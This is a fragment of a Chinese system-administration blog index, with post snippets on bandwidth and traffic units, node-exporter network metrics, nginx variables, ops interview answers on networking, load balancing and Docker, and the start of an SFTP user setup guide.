宽带：在数字通信中通常指64kbit/s以上信号的带宽。 窄带：在数字通信中通常指64kbit/s以下信号的带宽。 宽带 通常别人会说你家能不能上网？其实这个意思就是你家有没有宽带，换句话说，就是一个名词，先有了宽带一词，然后才可以说你带宽是多少，宽带与上网的速度快慢没有直接关系。 带宽 当我们想申请宽带了，需要到一些服务提供商那里注册登记，这时会根据套餐的不同，你可能会有10Mb/s 、 20Mb/s等，可以计算机字节换算比例可以计算出自己的带宽大小 比如： 1B=8b //1字节=8位 1KB=1024B 1MB=1024KB 1GB=1024MB 我们申请的带宽是10Mb/s这个单位中的b是小写的，而我们刚才说的1B(字节)=8b(位),这里刚好是8倍的关系，即下载速度：10Mb / 8 = 1.25MB 有的人就会问，为什么要除以8? 在计算机中，下载速度是以字节(B)为单位的，而提供商说的是以比特(b)为单位的。 比如说: 在网上下载一个软件，都会以B(字节)为单位的，再比如你打开一个网页，这个网页中可能会有图片，文字，视频等内容，这些内容本质上来说，也是下载到你电脑了，然后你才能看到的 我们可以带宽来计算出自己的下载速度： 计算方式：带宽大小 / 8 带宽 下载速度 公式 带宽为2Mb 下载速度为256KB/s 2 / 8 = 0.25 带宽为4Mb 下载速度为512KB/s 4 / 8 = 0.5 带宽为8Mb 下载速度为1.00MB/s 8 / 8= 1.0 带宽为10Mb 下载速度为1.25MB/s 10 / 8 = 1.25 带宽为20Mb 下载速度为2.50MB/s 20 / 8 = 2.50 带宽为100Mb 下载速度为12.5MB/s 100 / 8 = 12.50 有的时候，使用一些软件测试网速时，发现与我们计算的结果有点差距，这个是正常现象，这是由于一些物理线路磨损等客观原因造成的。 还有的时候，大家在深夜下载软件时，会发现，下载速度超过了我们理论上计算出来的值，这种情况也是存在的, 我们可以这样理解: 比如你家在J区，那么提供商拉到J区的总线路是100Mb/s , 而你家申请的是10M,由于限制都是从路由器里设置的，这个与设置路由器的设置有关。 第二种情况就是，你下载软件的服务器比较闲，这样速度也是比较快的。 第三种情况就是我们下载软件时，可能会用迅雷呀这方面的软件，由于这个软件下载的人多了，那么他的速度也是比较快的。 通俗理解的话： 带宽就好比你的水龙头大小，网速就相好比从水龙头里出来的水流速有多快。 以上都是说下载速度，那么上传速度是怎么计算的呢，其实上传速度这个与地域的不同而不同，一般上传速度都被提供商限制了，这个说不准。 流量 流量是对外发送数据与接收数据包的大小总和，单位是采取1024进制的，单位有 B, KB, MB(M), GB(G) 1G=1024MB 1M=1024KB 1KB=1024字节(B） 一般我们手机有 5元30MB, 10元70MB的流量套餐，当我们打开一个网页，需要多少流量呢 假设某一个网页上有 100 个汉字与一张100KB的图片，一个汉字 = 2个字节 即这个页面的数据大小为：100 * 2B / 1024 + 100KB = 0.2KB +100KB = 100.2KB； 每访问一次这个页面，将产生100.2KB的流量，如果是70MB的流量，那么访问几个网页基本快没有了，所以更不要说看视频了。 带宽、网速和流量之间的关系 通常情况下：我们说的 我家的带宽10M 现在网速网速：200KB/s 看一张图片使用了8M的流量 那么带宽、网速、流量之间有什么关系，他们分别代表什么呢？ 带宽单位是：比特/秒（bps）：10M=10Mbps 网速是数据传输的速度，单位是：字节/秒 (B/s， KB/s， MB/s) 1MB/s = 1024KB/s 1KB/s = 1024B/s 流量是用户上网 发送和接收 的 数据量总和 ，单位是：字节（Byte) 比特是信息的最小单位：1字节 = 8比特 也就是1B = 8bit 或者 1B = 8b 1字节/秒 = 8比特/秒 (1B/s = 8bps) 1比特 (1b or 1位) 是信息技术中的最小存储单位，1 位代表一个“1”或者“0” 1B（1字节）是比较小的存储单位：一般情况下1个英文字母占1个字节；一个汉字占2个字节 他们之间的换算：带宽大小 / 8 10M带宽(10Mb/s)=1.25MB/s网速 1M带宽(1Mb/s)=0.125MB/s=128KB/s 10Mbps = 10*1024Kbps =10*1024*1024bps =10*1024*1024/8 Byte/s =10/8 MB/s =1.25 MB/s 上行带宽和下行带宽是什么意思？各有什么作用？ 上行带宽和下行带宽，或者说上行速度和下行速度是什么意思? 在设置路由器的限速，或者配置其它一些软件的时会遇到上行速度和下行速度的配置，很多用户根本就不知道这两个所代表的意思，下面会对这两种进行详细讲解： 在访问互联网时存在两种行为：一是上传数据，二是下载数据。上行宽带(速度) 指的是上传的速度，而下行宽带(速度) 指的是下载数据时的数度。 在详细一点可以理解为 上行带宽即上行速率 一般是指从你的电脑上传的速度，别人对你的电脑进行通讯的速率。比如你往QQ空间上传你的相片，这个时候上传相片的速度就是上行速度，其他还有比如你往一些云盘里面上传文件的时候，这个时候的速度也是上行速率，我们可能会发现，通常情况下，上传文件的速度比我们平常使用的网络速度要慢很多。 下行带宽即下行速率 一般是你从网络上的主机下载的速度，比如你下载文件的速度，打开网页的速度，这种速度就是下行速率，下行速率通常就是我们平常所说的网速，比如你的带宽是电信8M,光纤20M等，这种速度其实就是指的网络的下行速率。 上行宽带(速度)和下行宽带(速度)是不对称的。 一般是下行速度大于上行的速度。我们平时所使用的宽带说多少M，都是指的下行宽带，因为我们上网主要是从互联网上下载数据，而上传的数据量要少很多。 为什么在使用宽带的过程中，发现电脑下载的速度根本就达不到自己办理的宽带的标准，例如10Mb/s的宽带，下载速度只有1MB/s左右的速度，这是为什么呢? 因为宽带运营商的带宽下行速度和Windows电脑上的下行速度的单位不一样 ，Windows电脑的单位是KBbs/s,而宽带运营上的单位是Kbbs/s，1B=8b(1字节=8位)。 假设你办理了10M的宽带，10Mbps=10240Kbps/8=1280KBps,所以在你电脑的最大的下载速度只有1280KBps，也就是大概1.25MB/s左右的样子。所以不要再说宽带公司坑人，办理的宽带扣量了，这只不过是计算的单位不同引起的。 宽带的下载速率除宽带带宽外，与计算机配置、使用的下载软件，下载的大小、下载网站的速率等均有关系，一般的下载软件都可以查看的宽带下载速率(如迅雷)。 理想的状态下：100M光纤宽带的下行宽带在10M/S-11M/s之间；上行宽带是指上传到互联网上的速度；这个要开你开通的宽带是上下行等同还是不等同了；不知道的可以咨询你的运营商；如果是等同的你的上行宽带也是10M/S - 11M/s之间；不是等同的一般上行宽带只有400kbs/s-500Kbs/s。 注：一般企业开通的是上下行带宽等同的；家用的是不等同，一般只管下行带宽，上行的不管的。 服务器的上行和下行带宽理解 对服务器而言， 客户端下载资源消耗的是服务器的上行流量，客户端上传资源消耗的是服务器的下行流量， 通常买的服务器，比如阿里云，一般买的带宽指的是上行带宽，下行通常是不限的。而且流量的计算一般都是以上行的来计算的。 所以，客户端上传资源，对服务器的带宽基本没有影响，因为服务器的下行基本不限的，跟客户端本身网络的带宽有影响； 而客户端下载资源，除了跟服务器的带宽有影响，跟客户端本身的网络带宽也有影响的。 服务器的上行带宽 服务器的上行带宽主要用于本地用户请求服务器上的资源(每秒钟服务器传给客户端的最大数据量,服务器流出的带宽)（即本地的下载、服务器的上传）`,如果是在其他机器下载服务器上的文件，用的主要是服务器的上行带宽。 这里一定要分清楚上行带宽和下行带宽是对谁而言的，个人PC下载速度看的是自己的下行带宽和服务器的上行带宽 个人PC（A）与服务器（B）连接，服务器B的最大上行带宽（上行速度）决定了PC最大下载速度 服务器的下行带宽 下行带宽主要用于本地用户上传文件至服务器(客户上传数据到服务器),对于服务器来说，下行带宽是不限制的，网络因素，取决于客户端当前的网络情况 内网ip和外网ip区别 区别 如图，假设我们的计算机是设备一，想要访问百度。 如果使用校园网，首先需要先通过校园网的路由器把我们的内网ip转为校园网的外网ip。 然后通过这个外网ip先连接上湖南电信的网关，最后在连接上百度的网关。 百度把你请求的信息回传到你的校园网网关，校园网网关再把信息传给你（整个网络呈网状结构，它会自动找到一条","date":"2023-11-03","objectID":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/:0:0","tags":["linux","解决方案"],"title":"内网.外网.宽带.带宽.流量.网速之间的区别与联系","uri":"/posts/linux/%E5%86%85%E7%BD%91.%E5%A4%96%E7%BD%91.%E5%AE%BD%E5%B8%A6.%E5%B8%A6%E5%AE%BD.%E6%B5%81%E9%87%8F.%E7%BD%91%E9%80%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"},{"categories":["linux","运维记事","整理收集"],"content":"node-exporter 连接数相关指标","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事","整理收集"],"content":" 以下为资料来源,由本站收集重新整理发布,仅用于个人收藏,转载请直接标注以下来源连接 node-export中连接数相关指标 TCP相关指标 名称 类型 单位 说明 node_netstat_Tcp_InErrs counter 报文数 TCP 接收的错误报文数 node_netstat_Tcp_InSegs counter 报文数 TCP 接收的目前所有建立连接的错误报文数 node_netstat_Tcp_OutSegs counter 报文数 TCP 发送的报文数（包括当前连接的段但是不包括重传的段) node_netstat_Tcp_RetransSegs counter 报文数 TCP 重传报文数 node_netstat_Tcp_CurrEstab counter 报文数 当前状态为 ESTABLISHED 或 CLOSE-WAIT 的 TCP 连接数 node_netstat_Tcp_ActiveOpens counter 报文数 已从 CLOSED 状态直接转换到 SYN-SENT 状态的 TCP 连接数 node_netstat_Tcp_PassiveOpens counter 报文数 已从 LISTEN 状态直接转换到 SYN-RCVD 状态的 TCP 平均连接数 node_netstat_TcpExt_ListenDrops counter 报文数 监听队列连接丢弃数 node_netstat_TcpExt_ListenOverflows counter 报文数 监听 socket 的队列溢出 node_netstat_TcpExt_SyncookiesFailed counter 报文数 接收的无效的 SYN cookies 的数量 node_netstat_TcpExt_SyncookiesRecv counter 报文数 接收的 SYN cookies 的数量 node_netstat_TcpExt_SyncookiesSent counter 报文数 发送的 SYN cookies 的数量 node_sockstat_TCP_alloc Graph 报文数 已分配（已建立、已申请到sk_buff）的TCP套接字数量 node_sockstat_TCP_inuse Graph 报文数 正在使用（正在侦听）的TCP套接字数量 node_sockstat_TCP_mem Graph 报文数 TCP 套接字缓冲区使用量 node_sockstat_TCP_orphan Graph 报文数 无主（不属于任何进程）的TCP连接数（无用、待销毁的TCP socket数） node_sockstat_TCP_tw Graph 报文数 等待关闭的TCP连接数 node_sockstat_TCP_mem_bytes Graph bytes TCP 套接字缓冲区比特数 UDP 相关指标 名称 类型 单位 说明 node_sockstat_UDPLITE_inuse Graph 报文数 正在使用的 UDP-Lite 套接字数量 node_sockstat_UDP_inuse Graph 报文数 正在使用的 UDP 套接字数量 node_sockstat_UDP_mem Graph 报文数 UDP 套接字缓冲区使用量 node_sockstat_UDP_mem_bytes Graph bytes UDP 套接字缓冲区比特数 node_netstat_Udp_InDatagrams Graph 报文数 接收的 UDP 数据包 node_netstat_Udp_OutDatagrams Graph 报文数 发送的 UDP 数据包 node_netstat_Udp_InErrors Graph 报文数 本机端口未监听之外的其他原因引起的 UDP 入包无法送达(应用层)的数量 node_netstat_Udp_NoPorts Graph 报文数 未知端口接收 UDP 数据包的数量 node_netstat_UdpLite_InErrors Graph 报文数 本机端口未监听之外的其他原因引起的 UDP-Lite 入包无法送达(应用层)的数量 UDP与UDP-lite的区别 传统的UDP协议是对其载荷（Payload）进行完整的校验的，如果其中的一些位（哪怕只有一位）发生了变化，那么整个数据包都有可能被丢弃，在某些情况下，丢掉这个包的代价是非常大的，尤其当包比较大的时候。在UDP-Lite协议中，一个数据包到底需不需要对其载荷进行校验，或者是校验多少位都是由用户控制的（leeming注释：这是这种可选择性，其实udp_lite的代码实现是比udp``复杂的，though 字面上有个lite），并且UDP-Lite协议就是用UDP协议的Length字段来表示其Checksum Coverage的，所以当UDP-Lite协议的Checksum Coverage字段等于整个UDP数据包（包括UDP头和载荷）的长度时，UDP-Lite产生的包也将和传统的UDP包一模一样。 ICMP Internet Control Message Protocol，ICMP是网路协议族的核心协议之一。它用于TCP/IP网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，通过这些信息，令管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。 ICMP通常用于返回的错误信息或是分析路由。ICMP错误消息总是包括了源数据并返回给发送者。 ICMP错误消息的例子之一是TTL值过期。每个路由器在转发数据报的时候都会把ip包头中的TTL值减一。如果TTL值为0，TTL在传输中过期的消息将会回报给源地址。 名称 类型 单位 说明 node_netstat_Icmp_InErrors Graph 报文数 接收的 ICMP 错误的报文（例如ICMP校验和错误、长度错误等） node_netstat_Icmp_InMsgs Graph 报文数 接收的报文数 node_netstat_Icmp_OutMsgs Graph 报文数 发送的报文数 Sockstat 的其他指标 名称 类型 单位 说明 node_sockstat_sockets_used Graph 报文数 使用的所有协议套接字总量 node_sockstat_FRAG_inuse Graph 报文数 正在使用的 Frag 套接字数量 node_sockstat_FRAG_memory Graph 报文数 使用的 Frag 缓冲区 node_sockstat_RAW_inuse Graph 报文数 正在使用的 Raw 套接字数量 ","date":"2023-09-21","objectID":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/:0:0","tags":["linux","监控","prometheus","node-exporter"],"title":"node-exporter 连接数相关指标","uri":"/posts/linux/prometheus_%E8%BF%9E%E6%8E%A5%E6%95%B0%E7%9B%B8%E5%85%B3%E6%8C%87%E6%A0%87/"},{"categories":["windows","整理收集"],"content":"常用的BAT脚本语法","date":"2023-04-06","objectID":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/","tags":["linux","windows","bat","转发内容"],"title":"常用的BAT脚本语法","uri":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"categories":["windows","整理收集"],"content":" 我们在日常工作中常常会遇到一些需要重复进行的工作，又或者我们的项目在转交客户时需要去简化配置过程 这时我们就需要使用到一些自动化部署操作，我们常常会采用脚本来完成这部分功能 下面我们来介绍一种脚本类型Bat脚本，我们会从以下方面介绍： 脚本介绍 Bat脚本基本语法 Bat脚本常用语法 Bat脚本进阶内容 引用 https://www.cnblogs.com/qiuluoyuweiliang/p/17288356.html ","date":"2023-04-06","objectID":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/:0:0","tags":["linux","windows","bat","转发内容"],"title":"常用的BAT脚本语法","uri":"/posts/windows/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC%E8%AF%AD%E6%B3%95/"},{"categories":["linux","整理收集"],"content":"NGINX中变量详解","date":"2023-03-20","objectID":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/","tags":["linux","nginx"],"title":"NGINX中变量详解","uri":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":" 以下为资料来源,由本站收集重新整理发布,仅用于个人收藏,转载请直接标注以下来源连接 http://www.hangdaowangluo.com/archives/754 http Croe模块 - - $http_user_agent 客户端UA信息 $http_cookie 客户端COOKIE $cookie_name 参考$arg_name的用法 $arg_name 获取URI中的GET参数，比方说http://localhost:8080/test?class=3，则用$arg_class获取。注：1）不区分大小写，例如CLASS=2同样使用$arg_class获取；2）如果参数escape编码了，使用set_unescape_uri 反编码，例如：set_unescape_uri $name $arg_name;set_unescape_uri $class $arg_class;echo “name: $name”;echo “class: $class” $args 获取url中的GET参数字符串,www.129.com/?name=a1\u0026b=b1，$args=name=a1\u0026b=b1 $binary_remote_addr 二进制格式的客户端地址，例如\\xC0\\xA8P\\x81，表示为192.168.80.1 $body_bytes_sent 响应体的大小，即使发生了中断或者是放弃，也是一样的准确。 $bytes_sent number of bytes sent to a client $connection connection serial number $connection_requests current number of requests made through a connection $content_length 请求头部信息中的Content-Length $content_type 请求头部信息中的Content-Type $document_root 变量的值为当前请求的location（http，server，location，location中的if）中root指令中指定的值，或alias的值 $document_uri 同$uri $host 该变量的值等于请求头中Host的值。如果Host无效时，那么就是处理该请求的server的名称。在下列情况中，$host变量的取值不同于$http_host变量。1) 当请求头中的Host字段未指定（使用默认值）或者为空值，那么$host等于server_name指令指定的值。2) 当Host字段包含端口是，$host并不包含端口号。另外，从0.8.17之后的nginx中，$host的值总是小写。 $hostname 有gethostname返回值设置机器名 $http_name 该变量的值为HTTP 请求头HEADER，具体使用时会转换为小写，并且将“——”（破折号）转换为“_”(下划线)。例如$http_Connection $https “on” if connection operates in SSL mode, or an empty string otherwise $is_args “?” if a request line has arguments, or an empty string otherwise $limit_rate 该变量允许限制连接速率，参考 limit_rate $msec current time in seconds with the milliseconds resolution (1.3.9, 1.2.6) $nginx_version 版本 $pid Pid $pipe “p” if request was pipelined, “.” otherwise (1.3.12, 1.2.7) $query_string 同$args $realpath_root an absolute pathname corresponding to the root or alias directive’s value for the current request, with all symbolic links resolved to real paths $remote_addr 客户端的IP地址 $remote_port 客户端连接端口 $remote_user 变量等于用户的名字，基本身份验证模块使用 $request full original request line $request_body 该变量包含了请求体的主要信息。该变量与proxy_pass或者fastcgi_pass相关 $request_body_file 客户端请求体的临时文件 $request_completion 如果请求成功完成，那么显示“OK”。如果请求没有完成或者请求不是该请求系列的最后一部分，那么它的值为空。 $request_filename 该变量等于当前请求文件的路径，有指令root或者alias和URI构成 $request_id unique request identifier generated from 16 random bytes, in hexadecimal (1.11.0) $request_length request length (including request line, header, and request body) (1.3.12, 1.2.7) $request_method 该变量的值通常是GET或者POST。 $request_time request processing time in seconds with a milliseconds resolution (1.3.9, 1.2.6); time elapsed since the first bytes were read from the client $request_uri 该变量的值等于原始的URI请求，就是说从客户端收到的参数包括了原始请求的URI，该值是不可以被修改的，不包含主机名，例如“/foo/bar.php?arg=baz”。 $scheme 功能：该变量表示HTTP scheme（例如HTTP，HTTPS），根据实际使用情况来决定，例如：rewrite ^ $scheme://example.com$uri redirect; $sent_http_name arbitrary response header field; the last part of a variable name is the field name converted to lower case with dashes replaced by underscores $server_addr 该变量的值等于服务器的地址。通常来说，在完成一次系统调用之后就会获取变量的值，为了避开系统钓鱼，那么必须在listen指令中使用bind参数。 $server_name 该变量为server的名字。 $server_port 该变量等于接收请求的端口 $server_protocol 该变量的值为请求协议的值，通常是HTTP/1.0或者HTTP/1.1 $status response status (1.3.2, 1.2.2) $tcpinfo_rtt, $tcpinfo_rttvar, $tcpinfo_snd_cwnd, $tcpinfo_rcv_space information about the client TCP connection; available on systems that support the TCP_INFO socket option $time_iso8601 local time in the ISO 8601 standard format (1.3.12, 1.2.7) $time_local local time in the Common Log Format (1.3.12, 1.2.7) $uri 该变量的值等于当前请求中的URI（没有参数，不包括$args）的值。它的值不同于request_uri，由浏览器客户端发送的request_uri的值。例如，可能会被内部重定向或者使用index。另外需要注意：$uri不包含主机名，例如 “/foo/bar.html”当前判断URL= $scheme://$server_name/$uri ","date":"2023-03-20","objectID":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","nginx"],"title":"NGINX中变量详解","uri":"/posts/linux/nginx%E4%B8%AD%E5%8F%98%E9%87%8F%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":"运维常见面试题","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","整理收集"],"content":" 1. 请简述OSI七层网络模型有哪些层及各自的含义 物理层：底层数据传输，比如网线、网卡标准 数据链路层：定义数据的基本格式，如何传输，如何标识。比如网卡MAC地址 网络层：定义IP编码，定义路由功能，比如不同设备的数据转发 传输层：端到端传输数据的基本功能，比如TCP、UDP 会话层：控制应用程序之间会话能力，比如不同软件数据分发给不停软件 表示层：数据格式标识，基本压缩加密功能。 应用层：各种应用软件，包括 Web 应用。 2. 在Linux的LVM分区格式下，请简述给根分区磁盘扩容的步骤. 这个分3种 第一种方法: growpart /dev/vda 1 resize2fs /dev/vda1 第二种方法: partpeobe /dev/sda resize2fs /dev/vda1 第三种方法: fdisk /dev/sdb # n p 1 1 回车 回车 t 8e w pvcreate /dev/sdb1 vgextend datavg /dev/sdb1 lvextend -r -L +100%free /dev/mapper/datavg-lv01 3. 讲述一下Tomcat8005、8009、8080三个端口的含义？ 8005：关闭时使用 8009：为AJP端口，即容器使用，如Apache能通过AJP协议访问Tomcat的8009端口来实现功能 8080：一般应用使用 4. 简述DNS进行域名解析的过程？ 迭代查询（返回最优结果）、递归查询（本地找DNS）用户要访问 www.baidu.com，会先找本机的host文件，再找本地设置的DNS服务器，如果也没有找到，就去网络中找根服务器，根服务器反馈结果，说只能提供一级域名服务器.cn，就去找一级域名服务器，一级域名服务器说只能提供二级域名服务器.com.cn,就去找二级域名服务器，二级域服务器只能提供三级域名服务器.baidu.com.cn，就去找三级域名服务器，三级域名服务器正好有这个网站www.baidu.com，然后发给请求的服务器，保存一份之后，再发给客户端。 5. 讲一下Keepalived的工作原理？ 在一个虚拟路由器中，只有作为MASTER的VRRP(虚拟路由冗余协议)路由器会一直发送VRRP通告信息，BACKUP不会抢占MASTER，除非它的优先级更高。当MASTER不可用时(BACKUP收不到通告信息)多台BACKUP中优先级最高的这台会被抢占为MASTER。这种抢占是非常快速的(\u003c1s)，以保证服务的连续性由于安全性考虑，VRRP包使用了加密协议进行加密。BACKUP不会发送通告信息，只会接收通告信息。 6. LVS、Nginx、HAproxy有什么区别？工作中你怎么选择？ LVS： 抗负载能力强、工作在第4层仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的； 无流量，同时保证了均衡器IO的性能不会受到大流量的影响； 工作稳定，自身有完整的双机热备方案，如LVS+Keepalived和LVS+Heartbeat； 应用范围比较广，可以对所有应用做负载均衡； 配置简单，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率； LVS的缺点： 软件本身不支持正则处理，不能做动静分离，这就凸显了Nginx/HAProxy+Keepalived的优势。 如果网站应用比较庞大，LVS/DR+Keepalived就比较复杂了，特别是后面有Windows Server应用的机器，实施及配置还有维护过程就比较麻烦，相对而言，Nginx/HAProxy+Keepalived就简单多了。 Nginx： 工作在第7层，应用层，可以针对http应用做一些分流的策略。比如针对域名、目录结构。它的正则比HAProxy更为强大和灵活； Nginx对网络的依赖非常小，理论上能ping通就就能进行负载功能 Nginx安装和配置简单 可以承担高的负载压力且稳定，一般能支撑超过几万次的并发量； Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。Nginx在处理静态页面、特别是抗高并发方面相对apache有优势； Nginx作为Web反向代理加速缓存越来越成熟，速度比传统的Squid服务器更快 Nginx的缺点： Nginx不支持url来检测。 Nginx仅能支持http、https和Email协议 Nginx的Session的保持，Cookie的引导能力相对欠缺。 HAProxy： HAProxy是支持虚拟主机的，可以工作在4、7层(支持多网段)； 能够补充Nginx的一些缺点比如Session的保持，Cookie的引导等工作； 支持url检测后端的服务器； 它跟LVS一样，本身仅仅就只是一款负载均衡软件；单纯从效率上来讲HAProxy更会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的； HAProxy可以对Mysql读进行负载均衡，对后端的MySQL节点进行检测和负载均衡，不过在后端的MySQL slaves数量超过10台时性能不如LVS； HAProxy的算法较多，达到8种； 工作选择： HAproxy和Nginx由于可以做七层的转发，所以URL和目录的转发都可以做在很大并发量的时候我们就要选择LVS，像中小型公司的话并发量没那么大选择HAproxy或者Nginx足已，由于HAproxy由是专业的代理服务器配置简单，所以中小型企业推荐使用HAproxy。 7. docker的工作原理是什么，讲一下 docker是一个Client-Server结构的系统，docker守护进程运行在宿主机上，守护进程从客户端接受命令并管理运行在主机上的容器，容器是一个运行时环境，这就是我们说的集装箱。 8. docker的组成包含哪几大部分 一个完整的docker有以下几个部分组成： docker client：客户端，为用户提供一系列可执行命令，用户用这些命令实现跟 docker daemon 交互； docker daemon：守护进程，一般在宿主主机后台运行，等待接收来自客户端的请求消息； docker image：镜像，镜像run之后就生成为docker容器； docker container：容器，一个系统级别的服务，拥有自己的ip和系统目录结构；运行容器前需要本地存在对应的镜像，如果本地不存在该镜像则就去镜像仓库下载。 docker： 使用客户端-服务器 (C/S) 架构模式，使用远程api来管理和创建docker容器。docker 容器通过 docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。 9. docker与传统虚拟机的区别什么？ 传统虚拟机是需要安装整个操作系统的，然后再在上面安装业务应用，启动应用，通常需要几分钟去启动应用，而docker是直接使用镜像来运行业务容器的，其容器启动属于秒级别； Docker需要的资源更少，Docker在操作系统级别进行虚拟化，Docker容器和内核交互，几乎没有性能损耗，而虚拟机运行着整个操作系统，占用物理机的资源就比较多; Docker更轻量，Docker的架构可以共用一个内核与共享应用程序库，所占内存极小;同样的硬件环境，Docker运行的镜像数远多于虚拟机数量，对系统的利用率非常高; 与虚拟机相比，Docker隔离性更弱，Docker属于进程之间的隔离，虚拟机可实现系统级别隔离; Docker的安全性也更弱，Docker的租户root和宿主机root相同，一旦容器内的用户从普通用户权限提升为root权限，它就直接具备了宿主机的root权限，进而可进行无限制的操作。虚拟机租户root权限和宿主机的root虚拟机权限是分离的，并且虚拟机利用如Intel的VT-d和VT-x的ring-1硬件隔离技术，这种技术可以防止虚拟机突破和彼此交互，而容器至今还没有任何形式的硬件隔离; Docker的集中化管理工具还不算成熟，各种虚拟化技术都有成熟的管理工具，比如：VMware vCenter提供完备的虚拟机管理能力; Docker对业务的高可用支持是通过快速重新部署实现的，虚拟化具备负载均衡，高可用、容错、迁移和数据保护等经过生产实践检验的成熟保障机制，Vmware可承诺虚拟机99.999%高可用，保证业务连续性; 虚拟化创建是分钟级别的，Docker容器创建是秒级别的，Docker的快速迭代性，决定了无论是开发、测试、部署都可以节省大量时间; 虚拟机可以通过镜像实现环境交付的一致性，但镜像分发无法体系化，Docker在Dockerfile中记录了容器构建过程，可在集群中实现快速分发和快速部署。from wljslmz 10. docker技术的三大核心概念是什么？ 镜像：镜像是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，我们把应用程序和配置依赖打包好形成一个可交付的运行环境(包括代码、运行时需要的库、环境变量和配置文件等)，这个打包好的运行环境就是image镜像文件。 容器：容器是基于镜像创建的，是镜像运行起来之后的一个实例，容器才是真正运行业务程序的地方。如果把镜像比作程序里面的类，那么容器就是对象。 镜像仓库：存放镜像的地方，研发工程师打包好镜像之后需要把镜像上传到镜像仓库中去，然后就可以运行有仓库权限的人拉取镜像来运行容器了。 11. centos镜像几个G，但是docker centos镜像才几百兆，这是为什么？ 一个完整的Linux操作系统包含Linux内核和rootfs根文件系统，即我们熟悉的/dev、/","date":"2022-12-30","objectID":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/:0:0","tags":["linux","解决方案"],"title":"运维常见面试题","uri":"/posts/linux/%E8%BF%90%E7%BB%B4%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"categories":["linux","运维记事"],"content":"SFTP搭建","date":"2022-12-07","objectID":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/","tags":["linux","解决方案","sftp"],"title":"SFTP搭建","uri":"/posts/linux/sftp%E6%90%AD%E5%BB%BA/"},{"categories":["linux","运维记事"],"content":" 注意 本文内容仅在CentOS 7上进行测试 前言 文章介绍如何让sftp也可以实现vsftpd虚拟用户的功能。 对于运维来说，我们使用文件传输功能的时候都是优先使用vsftpd，而不是sftp,多数原因我想应该都是因为vsftpd具有虚拟用户的功能，这个功能在针对特定的服务来说是非常友好的。比如php服务降权启动时，被读取文件的文件权限问题。 上述的问题，sftp实际上也是可以解决，借助useradd -o选项实现。 [cxd@0x5c0f ~][0]$ useradd --help 用法：useradd [选项] 登录名 useradd -D useradd -D [选项] 选项： -h, --help 显示此帮助信息并退出 -k, --skel SKEL_DIR 使用此目录作为骨架目录 The skeleton directory, which contains files and directories to be copied in the user\\'s home directory, when the home directory is created by useradd. This option is only valid if the -m (or --create-home) option is specified. If this option is not set, the skeleton directory is defined by the SKEL variable in /etc/default/useradd or, by default, /etc/skel. -m, --create-home 创建用户的主目录 -o, --non-unique 允许使用重复的 UID 创建用户 This option is only valid in combination with the -u option. -s, --shell SHELL 新账户的登录 shell -u, --uid UID 新账户的用户 ID 正文 以下定义WEBServer的基础用户为www,以php为例,php-fpm启动进程所属则为www用户，那么也只能读取www用户所拥有操作权限的文件。 用户创建 创建sftp登陆用户，使用-o选项，让当前用户保持与www同属主UID、同属组GID $\u003e groupadd -o -g $(id -g www) webapp $\u003e useradd -o -u $(id -u www) -g webapp -m -k $(mktemp -d) -s /bin/false webapp # 此帐号只是sftp使用，所有创建时候添加-k选项，不让useradd复制/etc/skel下内容 帐号创建成功后，可在/etc/passwd中看到该帐号，此时应可以看到他的所属主和属组和www帐号一致 创建sftp登陆密钥 # 由于ssh-keygen在创建默认密钥时无法更新此路径，因此需要主动创建该目录 $\u003e mkdir 